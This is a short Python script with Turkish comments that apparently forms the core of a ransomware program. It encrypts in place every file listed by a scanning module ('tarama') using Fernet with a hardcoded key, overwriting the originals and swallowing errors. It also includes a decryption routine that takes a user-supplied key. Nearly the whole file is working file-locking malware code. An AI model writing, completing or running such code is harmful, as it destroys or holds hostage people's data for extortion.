from cryptography.fernet import Fernet
import tarama

global gelenbelge

gelenbelge=len(tarama.arr) #okunan dosya sayisi

key ="pcBNSaDONPVr6ehfX7c2SwHZPlxnyhVJx_Un64hTuaE="
bytekey1=key.encode() #anahtarin binary array seklinde alinmasi icin

for i in range(0,len(tarama.arr)): #okunan dosyalarda olusan bosluklari silindi
    tarama.arr[i]=tarama.arr[i].lstrip()
    print(tarama.arr[i])

def sifrele(a):

    try:
        data = ""
        with open(tarama.arr[a], "rb") as file: #dosya icerisindeki bilgi okuma
            data = file.read()
            file.close()

        f = Fernet(bytekey1)
        sifrelenmisveri = f.encrypt(data) #okunan data sifrelendi
        with open(tarama.arr[a], "wb") as file:
            file.write(sifrelenmisveri)
            file.close()
        print("sifreledi")
    except:

        pass

calisti=True
if calisti==True:   #sifreleme islemi tekrari önlendi
    for i in range(0, len(tarama.arr)):
        sifrele(i)
        print("sifrelendi")
    calisti=False



def coz(a,anahtar): #kullanici girisiyle sifrelemeyi çöz
    try:
        sifrelenmisveri = ""
        with open(tarama.arr[a], "rb") as file: #sifreli dosya icindeki veri okundu
            sifrelenmisveri = file.read()
            file.close()
        f = Fernet(anahtar)
        acilanveri = f.decrypt(sifrelenmisveri)
        with open(tarama.arr[a], "wb") as file: #cozulen veri dosyaya yazildi
            file.write(acilanveri)
            file.close()
        print("calisti")
    except:
        pass







